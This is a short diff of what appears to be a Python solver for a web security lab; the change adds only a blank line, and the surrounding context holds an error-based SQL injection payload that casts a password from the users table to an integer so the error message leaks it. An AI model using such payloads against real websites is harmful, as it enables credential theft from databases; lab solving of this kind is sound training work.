@@ -58,6 +58,7 @@ def main():
         print("[-] Failed to extract username. Check lab URL and session cookie.")
         sys.exit(1)
 
+
     print("[*] Extracting password for the same user...")
     payload_password = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
     password = extract_from_error(payload_password)
